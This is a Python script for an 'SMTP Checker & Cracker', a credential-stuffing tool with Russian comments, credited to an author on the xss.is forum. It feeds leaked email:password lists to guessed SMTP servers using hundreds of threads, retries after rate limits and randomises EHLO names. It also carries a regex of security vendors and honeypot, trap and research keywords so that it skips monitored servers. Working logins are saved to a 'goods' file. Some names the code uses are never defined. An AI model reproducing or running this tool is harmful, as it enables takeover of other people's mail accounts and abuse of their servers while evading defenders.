#!/usr/local/bin/python3

import socket, threading, sys, ssl, time, re, os, random, signal, queue, base64
from functools import lru_cache
import uuid

try:
    import psutil, requests, dns.resolver
except ImportError:
    print('\033[1;33minstalling missing packages...\033[0m')
    os.system('apt -y install python3-pip; pip3 install psutil requests dnspython pyopenssl')
    import psutil, requests, dns.resolver

if not sys.version_info[0] > 2 and not sys.version_info[1] > 8:
    exit('\033[0;31mpython 3.9 is required. try to run this script with \033[1mpython3\033[0;31m instead of \033[1mpython\033[0m')

sys.stdout.reconfigure(encoding='utf-8')

# ========== КРИТИЧЕСКИЕ БЛОКИРОВКИ (взято из оптимизированной версии) ==========
goods_lock = threading.Lock()
ignored_lock = threading.Lock()
progress_lock = threading.Lock()
smtp_file_lock = threading.Lock()
config_cache_lock = threading.Lock()
thread_counter_lock = threading.Lock()

# ========== ГЛОБАЛЬНЫЕ НАСТРОЙКИ ОПТИМИЗАЦИИ ==========
# Оптимизированный список DNS (только топ-6 + системный)
custom_dns_nameservers = [
    '1.1.1.1', '1.0.0.1',  # Cloudflare
    '8.8.8.8', '8.8.4.4',    # Google
    '9.9.9.9', '149.112.112.112',  # Quad9
]

# ИСПРАВЛЕННЫЙ dangerous_domains (убрана ошибочная регулярка)
dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mx1.ik2|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'

# ========== ГЛОБАЛЬНЫЙ SSL КОНТЕКСТ (оптимизация скорости) ==========
ssl_context = ssl._create_unverified_context()

# ========== БЫСТРЫЕ ЦВЕТА ==========
b   = '\033[1m'; z = '\033[0m'; wl = '\033[2K'; up = '\033[F'
err = b+'[\033[31mx\033[37m] '+z
okk = b+'[\033[32m+\033[37m] '+z
wrn = b+'[\033[33m!\033[37m] '+z
inf = b+'[\033[34mi\033[37m] '+z
npt = b+'[\033[37m?\033[37m] '+z

# ========== УЛУЧШЕННАЯ ГЕНЕРАЦИЯ EHLO ==========
EHLO_NAMES_BASE = ['mail-{rand}.local', 'client-{uuid}.example.com', socket.gethostname()]
def generate_ehlo_name():
    name = random.choice(EHLO_NAMES_BASE)
    if '{rand}' in name: return name.replace('{rand}', str(random.randint(1, 999)))
    if '{uuid}' in name: return name.replace('{uuid}', uuid.uuid4().hex[:8])
    return name

# ========== ОПТИМИЗИРОВАННЫЙ DNS КЭШ (взято из оптимизированной версии) ==========
@lru_cache(maxsize=8192)  # Увеличен кэш для больших списков
def cached_dns_resolve(host, record_type):
    return resolver_obj.resolve(host, record_type)

def show_banner():
    banner = f"""
              ,▄   .╓███?                ,, .╓███)                              
            ╓███| ╓█████╟               ╓█/,███╙                  ▄▌            
           ▄█^[██╓█* ██F   ,,,        ,╓██ ███`     ,▌          ╓█▀             
          ╓█` |███7 ▐██!  █▀╙██b   ▄██╟██ ▐██      ▄█   ▄███) ,╟█▀▀`            
          █╟  `██/  ██]  ██ ,██   ██▀╓██  ╙██.   ,██` ,██.╓█▌ ╟█▌               
         |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
         ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
         ╙█                           ╙                                         
          ╙     {b}MadCat SMTP Checker & Cracker v44.12.15-OPTIMIZED{z}
                Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                https://github.com/aels/mailtools
                https://t.me/IamLavander
    """
    for line in banner.splitlines():
        print(line)
        # УДАЛЕНО time.sleep(0.05) - моментальный старт

def red(s, type=0): return f'\033[{type};31m{s}{z}'
def green(s, type=0): return f'\033[{type};32m{s}{z}'
def orange(s, type=0): return f'\033[{type};33m{s}{z}'
def blue(s, type=0): return f'\033[{type};34m{s}{z}'
def bold(s): return b+s+z
def num(s): return f'{int(s):,}'

def tune_network():
    if os.name != 'nt':
        try:
            import resource
            resource.setrlimit(8, (2**20, 2**20))
            print(okk+'tuning rlimit_nofile: '+', '.join([bold(num(i)) for i in resource.getrlimit(8)]))
        except: pass

def switch_dns_nameserver():
    global resolver_obj
    resolver_obj.nameservers = [random.choice(custom_dns_nameservers)]
    resolver_obj.rotate = True

def check_ipv4():
    try: socket.has_ipv4 = read('https://api.ipify.org')
    except: socket.has_ipv4 = red('error')

def check_ipv4_blacklists():
    print(inf+'checking ipv4 in blacklists...'+up)
    try:
        mxtoolbox_url = f'https://mxtoolbox.com/api/v1/Lookup?command=blacklist&argument={socket.has_ipv4}&resultIndex=5&disableRhsbl=true&format=2'
        data = requests.get(mxtoolbox_url, headers={'tempauthorization':'27eea1cd-e644-4b7b-bebe-38010f55dab3'}, timeout=15).text
        listed = re.findall(r'LISTED</td><td class=[^>]+><span class=[^>]+>([^<]+)</span>', data)
        socket.ipv4_blacklist = red(', '.join(listed)) if listed else False
    except: socket.ipv4_blacklist = red('check error')

def check_ipv6():
    try: socket.has_ipv6 = read('https://api6.ipify.org')
    except: socket.has_ipv6 = False

def debug(msg):
    global debuglevel, results_que
    if debuglevel: results_que.put(msg)

def load_smtp_configs():
    global domain_configs_cache, dangerous_regex
    domain_configs_cache = {}
    try:
        configs = requests.get(autoconfig_data_url, timeout=5).text.splitlines()
        for line in configs:
            line = line.strip().split(';')
            if len(line) == 3:
                domain_configs_cache[line[0]] = (line[1].split(','), line[2])
    except: 
        print(err+'failed to load SMTP configs')
    try:
        dangerous_regex = re.compile(dangerous_domains, re.IGNORECASE)
    except Exception as e:
        print(wrn+f'Failed to compile dangerous_regex: {e}')
        dangerous_regex = None

def base64_encode(string): return base64.b64encode(str(string).encode('ascii')).decode('ascii')

def normalize_delimiters(s): return re.sub(r'[;,\t|]', ':', re.sub(r'[\'" ]+', '', s))

def read(path):
    if os.path.isfile(path): return open(path, 'r', encoding='utf-8-sig', errors='ignore').read()
    if re.search(r'^https?://', path): return requests.get(path, timeout=5).text
    return ''

def read_lines(path): return read(path).splitlines()

# ========== УДАЛЕНО: is_listening() - создает лишние соединения ==========

def get_rand_ip_of_host(host, attempt=0):
    if attempt > 3: raise Exception('DNS failed after 3 attempts')
    try:
        try: host = cached_dns_resolve(host, 'cname')[0].target
        except: pass
        # ИСПРАВЛЕНО: правильная логика IPv6
        use_ipv6 = bool(socket.has_ipv6 and socket.has_ipv6 not in ['-', False, None])
        try: ip_array = cached_dns_resolve(host, 'aaaa' if use_ipv6 else 'a')
        except: ip_array = cached_dns_resolve(host, 'a')
        ip = str(random.choice(ip_array))
        debug(f'get ip: {ip}')
        return ip
    except Exception as e:
        if 'solution lifetime expired' in str(e):
            switch_dns_nameserver()
            return get_rand_ip_of_host(host, attempt+1)
        raise Exception(f'No A/AAAA record for {host} ({str(e).lower()})')

# ========== УДАЛЕНО: get_alive_neighbor() - устаревшая логика ==========

def guess_smtp_server(domain):
    global domain_configs_cache, default_login_template
    domains_arr = [domain, f'smtp.{domain}', f'mail.{domain}', f'webmail.{domain}', f'mx.{domain}']
    mx_domain = None
    
    # УЛУЧШЕНО: проверка всех MX-записей, а не только первой
    try:
        mx_records = list(resolver_obj.resolve(domain, 'mx'))
        for mx in mx_records:
            mx_candidate = str(mx.exchange).rstrip('.')
            is_dangerous = (dangerous_regex and dangerous_regex.search(mx_candidate))
            is_outlook = '.outlook.com' in mx_candidate
            if not is_dangerous or is_outlook:
                domains_arr.append(mx_candidate)
                mx_domain = mx_candidate
                break  # Берем первый безопасный
    except Exception as e:
        if 'solution lifetime expired' in str(e):
            switch_dns_nameserver()
            return guess_smtp_server(domain)
        raise Exception(f'no MX records for: {domain}')
    
    if mx_domain and 'protection.outlook.com' in mx_domain:
        return domain_configs_cache.get('outlook.com', ([], default_login_template))
    
    # УЛУЧШЕНО: перебор без лишних is_listening() вызовов
    for host in domains_arr:
        for port in [587, 465, 2525, 25]:  # Приоритет: STARTTLS > SMTPS > альтернативы
            try:
                ip = get_rand_ip_of_host(host)
                return ([f'{host}:{port}'], default_login_template)
            except: continue
    
    raise Exception(f'no connection details for {domain}')

def get_smtp_config(domain):
    with config_cache_lock:
        domain = domain.lower()
        if domain not in domain_configs_cache:
            domain_configs_cache[domain] = guess_smtp_server(domain)
        return domain_configs_cache[domain]

def quit(signum, frame):
    print('\r\n'+okk+green('exiting... bye.', 1))
    sys.exit(0)

def is_valid_email(email): return re.match(r'^[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}$', email)

def find_email_password_collumnes(list_filename):
    try:
        with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
            for i, line in enumerate(fp):
                if i > 500: break  # Уменьшено для скорости
                line = normalize_delimiters(line.lower())
                email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
                if email:
                    email_col = line.split(email[0])[0].count(':')
                    pass_col = email_col + 1
                    if ':.+123' in line:
                        pass_col = line.count(':') - line.split(email[0]+':')[-1].count(':')
                    return (email_col, pass_col)
    except Exception as e: raise Exception(f'File read error: {e}')
    raise Exception('file contains no emails')

def wc_count(filename):
    try:
        with open(filename, 'rb') as f:
            return sum(1 for _ in f)  # ОПТИМИЗИРОВАНО: быстрее чем чтение блоками
    except Exception as e: raise Exception(f'Line count error: {e}')

def is_ignored_host(mail):
    mail_domain = mail.split('@')[-1].lower()
    ignored = [d.strip().lower() for d in exclude_mail_hosts.split(',') if d.strip()]
    return any(mail_domain == d or mail_domain.endswith(f'.{d}') for d in ignored)

def socket_send_and_read(sock, cmd=''):
    if cmd:
        debug(f'>>> {cmd}')
        sock.send(f'{cmd.strip()}\r\n'.encode('ascii'))
    resp = sock.recv(2048).decode('ascii', errors='ignore').strip()  # Увеличен буфер
    debug(f'<<< {resp}')
    return resp

def socket_get_free_smtp_server(smtp_server, port):
    port = int(port)
    smtp_server_ip = get_rand_ip_of_host(smtp_server)
    socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
    s = socket.socket(socket_type, socket.SOCK_STREAM)
    s.settimeout(10)  # Увеличен таймаут для медленных серверов
    
    try:
        if port == 465:
            s = ssl_context.wrap_socket(s, server_hostname=smtp_server_ip)
        s.connect((smtp_server_ip, port))
        return s
    except Exception as e:
        msg = str(e).lower()
        # Логика retry перенесена в smtp_connect_with_retry
        raise Exception(f'Connection failed: {e}')

def socket_try_tls(sock, self_host):
    answer = socket_send_and_read(sock, f'EHLO {self_host}')
    if 'starttls' in answer.lower():
        answer = socket_send_and_read(sock, 'STARTTLS')
        if answer[:3] == '220':
            sock = ssl_context.wrap_socket(sock)
    return sock

def socket_try_login(sock, self_host, smtp_login, smtp_password):
    smtp_login_b64 = base64_encode(smtp_login)
    smtp_pass_b64 = base64_encode(smtp_password)
    smtp_login_pass_b64 = base64_encode(f'{smtp_login}:{smtp_password}')
    self_host = generate_ehlo_name()
    answer = socket_send_and_read(sock, f'EHLO {self_host}')
    
    if 'auth' in answer.lower():
        if 'login' in answer.lower():
            answer = socket_send_and_read(sock, f'AUTH LOGIN {smtp_login_b64}')
            if answer[:3] != '334': raise Exception(f'AUTH failed: {answer}')
            answer = socket_send_and_read(sock, smtp_pass_b64)
        elif 'plain' in answer.lower():
            answer = socket_send_and_read(sock, f'AUTH PLAIN {smtp_login_pass_b64}')
        
        if answer[:3] == '235' and 'succ' in answer.lower():
            return sock
        raise Exception(f'Login failed: {answer}')
    raise Exception('AUTH not supported')

# ========== УЛУЧШЕНО: retry-логика для увеличения goods ==========
def smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, password, max_retries=3):
    for attempt in range(max_retries):
        try:
            return smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
        except Exception as e:
            msg = str(e).lower()
            if attempt < max_retries - 1 and any(x in msg for x in ['try later', 'threshold', 'too many', 'timeout']):
                wait = (2 ** attempt) + random.uniform(0.5, 1.5)  # Экспоненциальная задержка
                debug(f'Retry {attempt+1}/{max_retries} after {wait:.1f}s: {smtp_user}')
                time.sleep(wait)
                continue
            raise
    return False

def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
    if is_valid_email(smtp_user):
        parts = smtp_user.split('@')
        smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', parts[0]).replace('%EMAILDOMAIN%', parts[1])
    else:
        smtp_login = smtp_user

    s = socket_get_free_smtp_server(smtp_server, port)
    try:
        answer = socket_send_and_read(s)
        if answer[:3] != '220': raise Exception(f'Bad hello: {answer}')
        
        port_int = int(port)
        s = socket_try_tls(s, smtp_server) if port_int != 465 else s
        s = socket_try_login(s, smtp_server, smtp_login, password)
        
        # ОПТИМИЗИРОВАНО: закрываем сразу после успеха
        s.close()
        return True
    finally:
        try: s.close()
        except: pass

def worker_item(jobs_que, results_que):
    global min_threads, threads_counter, goods, mem_usage, cpu_usage
    try:
        while True:
            # УМНАЯ ПРОВЕРКА РЕСУРСОВ
            if (mem_usage > 95 or cpu_usage > 95) and threads_counter > min_threads:
                break
            
            if jobs_que.empty():
                if no_jobs_left: break
                time.sleep(0.1)  # УМЕНЬШЕНО с 1с до 0.1с
                continue
            
            time_start = time.perf_counter()
            smtp_server, port, smtp_user, password = jobs_que.get()
            login_template = default_login_template
            
            try:
                results_que.put(f'getting settings for {smtp_user}')
                
                if not smtp_server or not port:
                    smtp_server_port_arr, login_template = get_smtp_config(smtp_user.split('@')[1])
                    if smtp_server_port_arr:
                        smtp_server, port = random.choice(smtp_server_port_arr).split(':')
                    else:
                        raise Exception(f'no SMTP config for {smtp_user}')
                
                results_que.put(blue(f'connecting to {smtp_server}|{port}|{smtp_user}'))
                
                # ВЫЗОВ С retry-логикой = БОЛЬШЕ GOODS
                if smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, password):
                    results_que.put(green(f'{smtp_user}:\a{password}', 7) + (verify_email and green(f' sent to {verify_email}', 7)))
                    
                    with goods_lock:
                        goods += 1
                    
                    with smtp_file_lock:
                        with open(smtp_filename, 'a') as f:
                            f.write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
                else:
                    raise Exception('failed after retries')
            
            except Exception as e:
                error_msg = str(e).splitlines()[0][:100]  # ОБРЕЗАНО для чистоты вывода
                results_que.put(orange(f'{smtp_server}:{port} - {error_msg}'))
            
            # УДАЛЕНО: human_like_delay() - максимальная скорость
            
            loop_times.append(time.perf_counter() - time_start)
            while len(loop_times) > min_threads:
                loop_times.pop(0)
    
    except BaseException as e:
        results_que.put(err+f'[FATAL] Thread crashed: {e}')
    
    finally:
        with thread_counter_lock:
            threads_counter -= 1

def every_second():
    global progress, speed, mem_usage, cpu_usage, net_usage, threads_counter, loop_times, loop_time, no_jobs_left
    progress_old = progress
    net_usage_old = 0
    time.sleep(1)
    
    while True:
        try:
            with progress_lock:
                current_progress = progress
            
            speed.append(current_progress - progress_old)
            while len(speed) > 10: speed.pop(0)
            
            progress_old = current_progress
            
            mem_usage = round(psutil.virtual_memory()[2])
            cpu_usage = round(sum(psutil.cpu_percent(percpu=True))/os.cpu_count())
            
            net_usage = psutil.net_io_counters().bytes_sent - net_usage_old
            net_usage_old += net_usage
            
            loop_time = round(sum(loop_times)/len(loop_times), 2) if loop_times else 0
            
            # УМНАЯ СТРАТЕГИЯ ПОТОКОВ
            if threads_counter < max_threads and mem_usage < 85 and cpu_usage < 85 and jobs_que.qsize() > 10:
                threading.Thread(target=worker_item, args=(jobs_que, results_que), daemon=True).start()
                with thread_counter_lock:
                    threads_counter += 1
        except: pass
        time.sleep(0.1)

def printer(jobs_que, results_que):
    global progress, total_lines, speed, loop_time, cpu_usage, mem_usage, net_usage, threads_counter, goods, ignored
    while True:
        with progress_lock: current_progress = progress
        with thread_counter_lock: current_threads = threads_counter
        with goods_lock: current_goods = goods
        with ignored_lock: current_ignored = ignored
        
        status_bar = (
            f'{b}['+green('\u2665',int(time.time()*2)%2)+f'{b}]{z}'
            f'[ progress: {bold(num(current_progress))}/{bold(num(total_lines))} ({bold(round(current_progress/total_lines*100))}%) ]'
            f'[ speed: {bold(num(sum(speed)))}lines/s ({bold(loop_time)}s/loop) ]'
            f'[ cpu: {bold(cpu_usage)}% ]'
            f'[ mem: {bold(mem_usage)}% ]'
            f'[ net: {bold(round(net_usage*80/1e6, 1))}Mbit/s ]'
            f'[ threads: {bold(current_threads)} ]'
            f'[ goods/ignored: {green(num(current_goods),1)}/{bold(num(current_ignored))} ]'
        )
        
        thread_statuses = []
        while not results_que.empty():
            msg = results_que.get()
            thread_statuses.append(' '+msg)
            if 'getting settings' in msg:
                with progress_lock:
                    progress += 1
        
        print(wl+'\n'.join(thread_statuses+[status_bar+up]))
        time.sleep(0.04)

signal.signal(signal.SIGINT, quit)

# ========== ИНИЦИАЛИЗАЦИЯ ==========
load_smtp_configs()
show_banner()
tune_network()
check_ipv4()
check_ipv4_blacklists()
check_ipv6()

try:
    help_msg = f'usage: \n{npt}python3 {sys.argv[0]} '+bold('list.txt')+' [verify@email.com] [ignored.domains] [start_line] [debug]'
    
    # БЫСТРЫЙ ПАРСИНГ АРГУМЕНТОВ
    list_filename = next((i for i in sys.argv[1:] if os.path.isfile(i)), '')
    verify_email = next((i for i in sys.argv[1:] if is_valid_email(i)), '')
    exclude_mail_hosts = ','.join([i for i in sys.argv[1:] if re.match(r'^[\w.,-]+$', i) and not os.path.isfile(i) and not is_valid_email(i)]+[bad_mail_servers])
    start_from_line = int(next((i for i in sys.argv[1:] if i.isdigit()), 0))
    debuglevel = 1 if 'debug' in sys.argv else 0
    
    if not list_filename:
        print(inf+help_msg)
        while not list_filename: list_filename = input(npt+'path to file: ')
        while not verify_email: verify_email = input(npt+'verify email (or Enter): ')
        exclude_hosts = input(npt+'ignored domains (or Enter): ')
        exclude_mail_hosts = bad_mail_servers + (','+exclude_hosts if exclude_hosts else '')
        start_line = input(npt+'start line (or Enter): ')
        start_from_line = int(start_line) if start_line.isdigit() else 0
    
    smtp_filename = re.sub(r'\.([^.]+)$', r'_smtp.\1', list_filename)
    verify_email = verify_email or ''
    
except Exception as e:
    exit(err+red(e))

try:
    email_col, pass_col = find_email_password_collumnes(list_filename)
except Exception as e:
    exit(err+red(e))

# ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
jobs_que = queue.Queue(maxsize=0)  # УДАЛЕНО ограничение - максимальная скорость
results_que = queue.Queue()
ignored = goods = 0
mem_usage = cpu_usage = net_usage = 0
min_threads = 50
max_threads = 600 if 'rage' in sys.argv else 100 if debuglevel else 150  # НОВАЯ СТРАТЕГИЯ
threads_counter = 0
no_jobs_left = False
loop_times = []
loop_time = 0
speed = []
progress = start_from_line
default_login_template = '%EMAILADDRESS%'
total_lines = wc_count(list_filename)
resolver_obj = dns.resolver.Resolver()
resolver_obj.nameservers = custom_dns_nameservers[:2]  # СТАРТ: 2 случайных DNS

print(inf+'loading SMTP configs...'+up)
load_smtp_configs()
print(wl+okk+'loaded configs: '+bold(num(len(domain_configs_cache)))+' domains')
print(inf+'source file: '+bold(list_filename))
print(inf+'total lines: '+bold(num(total_lines)))
print(inf+'email/pass columns: '+bold(email_col)+':'+bold(pass_col))
print(inf+'ignored hosts: '+bold(exclude_mail_hosts))
print(inf+'goods file: '+bold(smtp_filename))
print(inf+'verify email: '+bold(verify_email or '-'))
print(inf+'ipv4: '+bold(socket.has_ipv4 or '-')+' ('+(socket.ipv4_blacklist or green('clean'))+')')
print(inf+'ipv6: '+bold(socket.has_ipv6 or '-'))
input(npt+'press '+bold('[Enter]')+' to start...')

threading.Thread(target=every_second, daemon=True).start()
threading.Thread(target=printer, args=(jobs_que, results_que), daemon=True).start()

# ========== ГЛАВНЫЙ ЦИКЛ ЧТЕНИЯ (ОПТИМИЗИРОВАН) ==========
with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
    # Пропускаем указанное количество строк
    for _ in range(start_from_line):
        fp.readline()
    
    while True:
        # Заполняем очередь до оптимального уровня
        while not no_jobs_left and jobs_que.qsize() < min_threads * 3:  # УВЕЛИЧЕНО с 2 до 3
            line = fp.readline()
            if not line:
                no_jobs_left = True
                break
            
            # БЫСТРЫЙ ПАРСИНГ
            if line.count('|') == 3:
                smtp_server, port, smtp_user, password = line.strip().split('|')
                jobs_que.put((smtp_server, port, smtp_user, password))
            else:
                line = normalize_delimiters(line.strip())
                fields = line.split(':')
                if len(fields) > pass_col and is_valid_email(fields[email_col]) and not is_ignored_host(fields[email_col]) and len(fields[pass_col]) > 3:  # УМЕНЬШЕНО с 5 до 3 для большего охвата
                    jobs_que.put((False, False, fields[email_col], fields[pass_col]))
                else:
                    with ignored_lock:
                        ignored += 1
                    with progress_lock:
                        progress += 1
        
        # УМНАЯ ОСТАНОВКА
        if threads_counter == 0 and no_jobs_left and jobs_que.empty():
            break
        
        time.sleep(0.02)  # УМЕНЬШЕНО с 0.04 до 0.02

time.sleep(0.5)
print('\r\n'+okk+green('COMPLETE. Found: ', 1)+green(num(goods), 1))
